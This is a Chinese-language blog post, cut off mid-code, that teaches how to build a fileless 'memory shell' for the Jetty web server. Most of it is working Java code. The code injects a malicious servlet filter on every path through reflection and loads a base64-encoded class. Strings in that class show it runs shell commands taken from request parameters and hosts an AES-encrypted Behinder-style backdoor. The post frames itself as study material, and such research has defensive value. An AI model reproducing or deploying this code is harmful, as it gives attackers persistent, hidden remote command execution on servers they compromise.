<!DOCTYPE html>
<html lang="zh-CN">
    <head prefix="og: https://ogp.me/ns#">
  <meta charset="utf-8">
  <meta name="referrer" content="no-referrer" />
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="color-scheme" content="light dark">
  
  <title>内存马系列 Jetty型内存马学习 - Boogiepop Doesn&#39;t Laugh</title>
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    <link rel='manifest' href='/manifest.json'>
  

  
  
  
  <meta property="og:title" content="内存马系列 Jetty型内存马学习 - Boogiepop Doesn&#39;t Laugh" />
  
  <meta property="og:type" content="article" />
  
  <meta property="og:url" content="http://boogipop.com/2023/10/01/%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97%20Jetty%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/index.html" />
  
  <meta property="og:image" content="/favicon.png" />
  
  <meta property="og:article:published_time" content="2023-10-01T02:37:50.000Z" />
  
  <meta property="og:article:author" content="Boogipop" />
  
  

  
<link rel="stylesheet" href="/css/var.css">

  
<link rel="stylesheet" href="/css/main.css">

  
<link rel="stylesheet" href="/css/typography.css">

  
<link rel="stylesheet" href="/css/code-highlighting.css">

  
<link rel="stylesheet" href="/css/components.css">

  
<link rel="stylesheet" href="/css/nav.css">

  
<link rel="stylesheet" href="/css/paginator.css">

  
<link rel="stylesheet" href="/css/footer.css">

  
<link rel="stylesheet" href="/css/post-list.css">

  
<link rel="stylesheet" href="/css/giscus.css">

  
  
<link rel="stylesheet" href="/css/rainbow-banner.css">

  
  
  
<link rel="stylesheet" href="/css/toc.css">

  
  
    
<link rel="stylesheet" href="/css/giscus.css">

  
  
  
  
<link rel="stylesheet" href="/css/post.css">

  
  
  
  
  

  
<meta name="generator" content="Hexo 6.3.0"></head>
    <body
        data-color-scheme="auto"
        data-uppercase-categories="true"
        
        data-rainbow-banner="true"
        data-rainbow-banner-shown="auto"
        data-rainbow-banner-month="6"
        data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
        
        data-config-root="/"
        
        data-toc="true"
        data-toc-max-depth="2"
        
        
    >
        <nav id="theme-nav">
    <div class="inner">
        <a class="title" href="/">Blog</a>
        <div class="nav-arrow"></div>
        <div class="nav-items">
            <a class="nav-item nav-item-home" href="/">Home</a>
            
            
            <a class="nav-item" href="/archives">Archives</a>
            
            
            
            <a class="nav-item" href="/friends">Friends</a>
            
            
            
            <a class="nav-item" href="/about">About</a>
            
            
            
            <a class="nav-item" href="/categories">Categories</a>
            
            
            
            <a class="nav-item nav-item-github nav-item-icon" href="https://github.com/MrWillCom" target="_blank" aria-label="GitHub">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-codepen nav-item-icon" href="https://codepen.io/mrwillcom" target="_blank" aria-label="CodePen">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-patreon nav-item-icon" href="https://www.patreon.com/MrWillCom" target="_blank" aria-label="Patreon">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-mastodon nav-item-icon" href="https://noc.social/@MrWillCom" target="_blank" aria-label="Mastodon">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-discord nav-item-icon" href="https://discord.gg/UKuFDjcfY8" target="_blank" aria-label="Discord">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-search nav-item-icon" href="/search" target="_blank" aria-label="Search">&nbsp;</a>
            
            
        </div>
    </div>
</nav>
        
<article class="post">
    <div class="meta">
        
        <div class="categories text-uppercase">
        
            <a href="/categories/At-Dawn/">At Dawn</a>
        
        </div>
        

        
        <div class="date" id="date">
            <span>October</span>
            <span>1,</span>
            <span>2023</span>
        </div>
        

        <h2 class="title">内存马系列 Jetty型内存马学习</h2>
    </div>

    <div class="divider"></div>

    <div class="content">
        <p>参考文章：<br><a target="_blank" rel="noopener" href="https://github.com/feihong-cs/memShell/blob/master/src/main/java/com/memshell/generic/FilterTemplate.java">https://github.com/feihong-cs/memShell/blob/master/src/main/java/com/memshell/generic/FilterTemplate.java</a><br><a target="_blank" rel="noopener" href="https://github.com/su18/MemoryShell/blob/main/memshell-test/memshell-test-jetty/src/org/su18/memshell/test/jetty/AddJettyFilter.java">https://github.com/su18/MemoryShell/blob/main/memshell-test/memshell-test-jetty/src/org/su18/memshell/test/jetty/AddJettyFilter.java</a><br><a target="_blank" rel="noopener" href="https://github.com/BeichenDream/GodzillaMemoryShellProject/blob/main/JettyMemoryShell/src/AesBase64JettyFilterShell.java">https://github.com/BeichenDream/GodzillaMemoryShellProject/blob/main/JettyMemoryShell/src/AesBase64JettyFilterShell.java</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12182#toc-4">https://xz.aliyun.com/t/12182#toc-4</a><br>环境搭建，依赖文件</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.eclipse.jetty/jetty-server --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.eclipse.jetty<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jetty-server<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>9.4.30.v20200611<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">scope</span>&gt;</span>provided<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="测试版本"><a href="#测试版本" class="headerlink" title="测试版本"></a>测试版本</h1><p>Jetty 9.4.52最新版</p>
<h1 id="Filter内存马"><a href="#Filter内存马" class="headerlink" title="Filter内存马"></a>Filter内存马</h1><h2 id="内存马构造"><a href="#内存马构造" class="headerlink" title="内存马构造"></a>内存马构造</h2><p>首先是注入部分。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.boogipop.memshell;</span><br><span class="line"><span class="keyword">import</span> sun.misc.BASE64Decoder;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AddFilterShell</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">Object</span> <span class="variable">servletHandler</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">filterName</span> <span class="operator">=</span> <span class="string">&quot;FilterTemplate&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">filterClassName</span> <span class="operator">=</span> <span class="string">&quot;com.boogipop.memshell.FilterTemplate&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;/*&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">LoadFilter</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            Thread.currentThread().getContextClassLoader().loadClass(filterClassName).newInstance();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            <span class="type">Method</span> <span class="variable">a</span> <span class="operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, <span class="type">byte</span>[].class, Integer.TYPE, Integer.TYPE);</span><br><span class="line">            a.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">byte</span>[] b = (<span class="keyword">new</span> <span class="title class_">BASE64Decoder</span>()).decodeBuffer(<span class="string">&quot;yv66vgAAADIBGwoAQwB7CQB8AH0IAH4KAH8AgAgAgQsAQACCCACDCgANAIQKAIUAhgoADQCHCQCIAIkIAIoHAIsIAIwIAI0IAF8IAI4HAI8KAJAAkQoAkACSCgCTAJQKABIAlQgAlgoAEgCXCgASAJgLAEEAmQoAmgCABwCbCgCFAJwLABwAnQsAHACeCACfCgCFAKALABwAoQgAogsAowCkCAClCgCmAKcHAKgHAKkKACgAewsAowCqCgAoAKsIAKwKACgArQoAKACuCgANAK8KACcAsAoApgCxBwCyCgAyAHsLAEAAswoAtAC1CgAyALYKAKYAtwcAuAoAQwC5CgA/ALoKADgAuwoAOAC8CgA/AL0IAL4HAL8HAMAHAMEKAD8AwgcAwwoAxADFBwDGCgBFAMcLAMgAyQcAygcAywEAAVUBAAxJbm5lckNsYXNzZXMBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAJkxjb20vYm9vZ2lwb3AvbWVtc2hlbGwvRmlsdGVyVGVtcGxhdGU7AQAEaW5pdAEAHyhMamF2YXgvc2VydmxldC9GaWx0ZXJDb25maWc7KVYBAAxmaWx0ZXJDb25maWcBABxMamF2YXgvc2VydmxldC9GaWx0ZXJDb25maWc7AQAKRXhjZXB0aW9ucwcAzAEACGRvRmlsdGVyAQBbKExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTtMamF2YXgvc2VydmxldC9GaWx0ZXJDaGFpbjspVgEABGNtZHMBABNbTGphdmEvbGFuZy9TdHJpbmc7AQAGcmVzdWx0AQASTGphdmEvbGFuZy9TdHJpbmc7AQADY21kAQABawEABmNpcGhlcgEAFUxqYXZheC9jcnlwdG8vQ2lwaGVyOwEADmV2aWxDbGFzc0J5dGVzAQACW0IBAAlldmlsQ2xhc3MBABFMamF2YS9sYW5nL0NsYXNzOwEACmV2aWxPYmplY3QBABJMamF2YS9sYW5nL09iamVjdDsBAAx0YXJnZXRNZXRob2QBABpMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAA5zZXJ2bGV0UmVxdWVzdAEAHkxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0OwEAD3NlcnZsZXRSZXNwb25zZQEAH0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTsBAAtmaWx0ZXJDaGFpbgEAG0xqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluOwEADVN0YWNrTWFwVGFibGUHAIsHAFwHAMYHAM0BAAdkZXN0cm95AQAKU291cmNlRmlsZQEAE0ZpbHRlclRlbXBsYXRlLmphdmEMAEwATQcAzgwAzwDQAQAdWytdIER5bmFtaWMgRmlsdGVyIHNheXMgaGVsbG8HANEMANIA0wEABHR5cGUMANQA1QEABWJhc2ljDAC+ANYHANcMANgA2QwA2gDbBwDcDADdAF4BAAEvAQAQamF2YS9sYW5nL1N0cmluZwEABy9iaW4vc2gBAAItYwEAAi9DAQARamF2YS91dGlsL1NjYW5uZXIHAN4MAN8A4AwA4QDiBwDjDADkAOUMAEwA5gEAAlxBDADnAOgMAOkA2QwA6gDrBwDsAQAlamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdAwA7QDZDADtANUMAO4A2QEABFBPU1QMAO8A2QwA8ADxAQABdQcA8gwA8wD0AQADQUVTBwD1DAD2APcBAB9qYXZheC9jcnlwdG8vc3BlYy9TZWNyZXRLZXlTcGVjAQAXamF2YS9sYW5nL1N0cmluZ0J1aWxkZXIMAPgA+QwA+gD7AQAADAD6APwMAP0A2QwA/gD/DABMAQAMAFMBAQEAFnN1bi9taXNjL0JBU0U2NERlY29kZXIMAQIBAwcBBAwBBQDZDAEGAQcMAQgBCQEAJmNvbS9ib29naXBvcC9tZW1zaGVsbC9GaWx0ZXJUZW1wbGF0ZSRVDAEKAQsMAQwBDQwATAEODAEPARAMAREBEgEABmVxdWFscwEAD2phdmEvbGFuZy9DbGFzcwEAHGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3QBAB1qYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZQwBEwEUAQAQamF2YS9sYW5nL09iamVjdAcBFQwBFgEXAQATamF2YS9sYW5nL0V4Y2VwdGlvbgwBGABNBwEZDABZARoBACRjb20vYm9vZ2lwb3AvbWVtc2hlbGwvRmlsdGVyVGVtcGxhdGUBABRqYXZheC9zZXJ2bGV0L0ZpbHRlcgEAHmphdmF4L3NlcnZsZXQvU2VydmxldEV4Y2VwdGlvbgEAE2phdmEvaW8vSU9FeGNlcHRpb24BABBqYXZhL2xhbmcvU3lzdGVtAQADb3V0AQAVTGphdmEvaW8vUHJpbnRTdHJlYW07AQATamF2YS9pby9QcmludFN0cmVhbQEAB3ByaW50bG4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAAxnZXRQYXJhbWV0ZXIBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEAFShMamF2YS9sYW5nL09iamVjdDspWgEAHGNvbS9ib29naXBvcC9tZW1zaGVsbC9Db25maWcBAAtnZXRQYXNzd29yZAEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAHaXNFbXB0eQEAAygpWgEADGphdmEvaW8vRmlsZQEACXNlcGFyYXRvcgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACgoW0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQARamF2YS9sYW5nL1Byb2Nlc3MBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQAMdXNlRGVsaW1pdGVyAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS91dGlsL1NjYW5uZXI7AQAEbmV4dAEACWdldFdyaXRlcgEAFygpTGphdmEvaW8vUHJpbnRXcml0ZXI7AQATamF2YS9pby9QcmludFdyaXRlcgEACWdldEhlYWRlcgEACWdldE1ldGhvZAEAFmdldEJlaGluZGVyU2hlbGxQd2RQd2QBAApnZXRTZXNzaW9uAQAiKClMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXNzaW9uOwEAHmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2Vzc2lvbgEADHNldEF0dHJpYnV0ZQEAJyhMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL09iamVjdDspVgEAE2phdmF4L2NyeXB0by9DaXBoZXIBAAtnZXRJbnN0YW5jZQEAKShMamF2YS9sYW5nL1N0cmluZzspTGphdmF4L2NyeXB0by9DaXBoZXI7AQAMZ2V0QXR0cmlidXRlAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL09iamVjdDsBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAh0b1N0cmluZwEACGdldEJ5dGVzAQAEKClbQgEAFyhbQkxqYXZhL2xhbmcvU3RyaW5nOylWAQAXKElMamF2YS9zZWN1cml0eS9LZXk7KVYBAAlnZXRSZWFkZXIBABooKUxqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyOwEAFmphdmEvaW8vQnVmZmVyZWRSZWFkZXIBAAhyZWFkTGluZQEADGRlY29kZUJ1ZmZlcgEAFihMamF2YS9sYW5nL1N0cmluZzspW0IBAAdkb0ZpbmFsAQAGKFtCKVtCAQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7AQAOZ2V0Q2xhc3NMb2FkZXIBABkoKUxqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQBAKExjb20vYm9vZ2lwb3AvbWVtc2hlbGwvRmlsdGVyVGVtcGxhdGU7TGphdmEvbGFuZy9DbGFzc0xvYWRlcjspVgEAAWcBABUoW0IpTGphdmEvbGFuZy9DbGFzczsBAAtuZXdJbnN0YW5jZQEAFCgpTGphdmEvbGFuZy9PYmplY3Q7AQARZ2V0RGVjbGFyZWRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kAQAGaW52b2tlAQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAPcHJpbnRTdGFja1RyYWNlAQAZamF2YXgvc2VydmxldC9GaWx0ZXJDaGFpbgEAQChMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7KVYAIQBIAEMAAQBJAAAABAABAEwATQABAE4AAAAvAAEAAQAAAAUqtwABsQAAAAIATwAAAAYAAQAAAAwAUAAAAAwAAQAAAAUAUQBSAAAAAQBTAFQAAgBOAAAANQAAAAIAAAABsQAAAAIATwAAAAYAAQAAABAAUAAAABYAAgAAAAEAUQBSAAAAAAABAFUAVgABAFcAAAAEAAEAWAABAFkAWgACAE4AAALFAAcACgAAAYqyAAISA7YABCsSBbkABgIAxgCQKxIFuQAGAgASB7YACJkAgCu4AAm5AAYCADoEGQTGAG0ZBLYACpoAZQE6BbIACxIMtgAImQAbBr0ADVkDEg5TWQQSD1NZBRkEUzoFpwAYBr0ADVkDEhBTWQQSEVNZBRkEUzoFuwASWbgAExkFtgAUtgAVtwAWEhe2ABi2ABk6Biy5ABoBABkGtgAbpwDsK8AAHLgAHbkAHgIAxgDVK8AAHLkAHwEAEiC2AAiZALe4ACE6BCvAABy5ACIBABIjGQS5ACQDABIluAAmOgUZBQW7ACdZuwAoWbcAKSvAABy5ACIBABIjuQAqAgC2ACsSLLYALbYALrYALxIltwAwtgAxGQW7ADJZtwAzK7kANAEAtgA1tgA2tgA3Oga7ADhZKiq2ADm2ADq3ADsZBrYAPDoHGQe2AD06CBkHEj4FvQA/WQMSQFNZBBJBU7YAQjoJGQkZCAW9AENZAytTWQQsU7YARFenABU6BBkEtgBGpwALLSssuQBHAwCxAAEArwF0AXcARQADAE8AAABuABsAAAAUAAgAFgAjABgALgAZADsAGgA+ABsASQAcAGEAHgB2ACAAkgAhAJ0AIwCvACYAwAAnAMUAKADXACkA3gAqARIAKwEsACwBQgAtAUkALgFgAC8BdAAzAXcAMQF5ADIBfgAzAYEANQGJADcAUAAAAI4ADgA+AF8AWwBcAAUAkgALAF0AXgAGAC4AbwBfAF4ABADFAK8AYABeAAQA3gCWAGEAYgAFASwASABjAGQABgFCADIAZQBmAAcBSQArAGcAaAAIAWAAFABpAGoACQF5AAUAawBsAAQAAAGKAFEAUgAAAAABigBtAG4AAQAAAYoAbwBwAAIAAAGKAHEAcgADAHMAAAAZAAj9AGEHAHQHAHUU+QAmAvsA00IHAHYJBwBXAAAABgACAHcAWAABAHgATQABAE4AAAArAAAAAQAAAAGxAAAAAgBPAAAABgABAAAAPABQAAAADAABAAAAAQBRAFIAAAACAHkAAAACAHoASwAAAAoAAQA4AEgASgAA&quot;</span>);</span><br><span class="line">            a.invoke(Thread.currentThread().getContextClassLoader(), b, <span class="number">0</span>, b.length);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取上下文</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">GetWebContent</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">Thread</span> <span class="variable">currentThread</span> <span class="operator">=</span> Thread.currentThread();</span><br><span class="line">            <span class="type">Object</span> <span class="variable">contextClassLoader</span> <span class="operator">=</span> GetField(currentThread, <span class="string">&quot;contextClassLoader&quot;</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">_context</span> <span class="operator">=</span> GetField(contextClassLoader,<span class="string">&quot;_context&quot;</span>);</span><br><span class="line">            servletHandler = GetField(_context,<span class="string">&quot;_servletHandler&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">InjectFilter</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">if</span>(servletHandler != <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="comment">//方法一</span></span><br><span class="line">            <span class="comment">//Filter HFilter = (Filter) Thread.currentThread().getContextClassLoader().loadClass(filterClassName).newInstance();</span></span><br><span class="line">            <span class="comment">//ArrayList filterPathMappings = (ArrayList) GetField(servletHandler,&quot;_filterPathMappings&quot;);</span></span><br><span class="line">            <span class="comment">//</span></span><br><span class="line">            <span class="comment">//Constructor constructor2 = servletHandler.getClass().getClassLoader().loadClass(&quot;org.eclipse.jetty.servlet.FilterHolder&quot;).getDeclaredConstructor();</span></span><br><span class="line">            <span class="comment">//constructor2.setAccessible(true);</span></span><br><span class="line">            <span class="comment">//Object filterHolder = constructor2.newInstance();</span></span><br><span class="line">            <span class="comment">//</span></span><br><span class="line">            <span class="comment">//Method setFilter = filterHolder.getClass().getDeclaredMethod(&quot;setFilter&quot;,Filter.class);</span></span><br><span class="line">            <span class="comment">//setFilter.invoke(filterHolder,HFilter);</span></span><br><span class="line">            <span class="comment">//</span></span><br><span class="line">            <span class="comment">//Method setName = filterHolder.getClass().getSuperclass().getDeclaredMethod(&quot;setName&quot;,String.class);</span></span><br><span class="line">            <span class="comment">//setName.invoke(filterHolder,filterName);</span></span><br><span class="line">            <span class="comment">//</span></span><br><span class="line">            <span class="comment">//Constructor constructor = servletHandler.getClass().getClassLoader().loadClass(&quot;org.eclipse.jetty.servlet.FilterMapping&quot;).getDeclaredConstructor();</span></span><br><span class="line">            <span class="comment">//constructor.setAccessible(true);</span></span><br><span class="line">            <span class="comment">//Object filterMapping = constructor.newInstance();</span></span><br><span class="line">            <span class="comment">//</span></span><br><span class="line">            <span class="comment">//Method setFilterName = filterMapping.getClass().getDeclaredMethod(&quot;setFilterName&quot;,String.class);</span></span><br><span class="line">            <span class="comment">//setFilterName.invoke(filterMapping,filterName);</span></span><br><span class="line">            <span class="comment">//</span></span><br><span class="line">            <span class="comment">//Method setFilterHolder = filterMapping.getClass().getDeclaredMethod(&quot;setFilterHolder&quot;,filterHolder.getClass());</span></span><br><span class="line">            <span class="comment">//setFilterHolder.setAccessible(true);</span></span><br><span class="line">            <span class="comment">//setFilterHolder.invoke(filterMapping,filterHolder);</span></span><br><span class="line">            <span class="comment">//</span></span><br><span class="line">            <span class="comment">//String pathSpecs = url;</span></span><br><span class="line">            <span class="comment">//</span></span><br><span class="line">            <span class="comment">//Method setPathSpec = filterMapping.getClass().getDeclaredMethod(&quot;setPathSpec&quot;,String.class);</span></span><br><span class="line">            <span class="comment">//setPathSpec.invoke(filterMapping,pathSpecs);</span></span><br><span class="line">            <span class="comment">//</span></span><br><span class="line">            <span class="comment">//filterPathMappings.add(filterMapping);</span></span><br><span class="line">            <span class="comment">//System.out.println(&quot;123&quot;);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="comment">//方法二</span></span><br><span class="line">            <span class="type">Class</span> <span class="variable">HFilter</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader().loadClass(filterClassName);</span><br><span class="line">            <span class="type">Method</span> <span class="variable">addFilterWithMapping</span> <span class="operator">=</span> GetMethod(servletHandler, <span class="string">&quot;addFilterWithMapping&quot;</span>, Class.class, String.class, Integer.TYPE);</span><br><span class="line">            addFilterWithMapping.invoke(servletHandler, HFilter, <span class="string">&quot;/*&quot;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//使用addFilterWithMapping有个问题，动态添加FilterMapping时，其dispatches可能会与已加载到内存中的FilterMapping重复了，因此需要调整元素在_filterPathMappings中的位置</span></span><br><span class="line">            <span class="type">Object</span> <span class="variable">filterMaps</span> <span class="operator">=</span> GetField(servletHandler, <span class="string">&quot;_filterMappings&quot;</span>);</span><br><span class="line">            Object[] tmpFilterMaps = <span class="keyword">new</span> <span class="title class_">Object</span>[Array.getLength(filterMaps)];</span><br><span class="line">            <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">            <span class="type">int</span> j;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; Array.getLength(filterMaps); ++j) &#123;</span><br><span class="line">                <span class="type">Object</span> <span class="variable">filter</span> <span class="operator">=</span> Array.get(filterMaps, j);</span><br><span class="line">                <span class="type">String</span> 